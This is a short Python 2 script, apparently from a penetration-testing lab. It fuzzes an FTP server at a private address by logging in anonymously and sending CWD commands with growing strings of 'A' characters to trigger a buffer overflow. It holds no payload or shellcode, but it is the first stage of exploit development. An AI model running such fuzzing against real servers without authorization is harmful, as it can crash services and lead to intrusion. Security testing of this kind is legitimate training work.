#!/usr/bin/python
import sys
import socket
import time

rhost = '172.16.162.166'

buffer = ["A"]
counter = 100
while len(buffer) <= 50:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
    print '[-] Fuzzing: {}'.format(len(string))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, 21))

        s.recv(2048)
        s.send('USER anonymous\r\n')
        s.recv(2048)
        s.send('PASS eder@mpt3.com\r\n')
        s.recv(2048)
        s.send('CWD {}\r\n'.format(string))
        s.close()
        time.sleep(1)
    except socket.error as error:
        s.close()
        print error
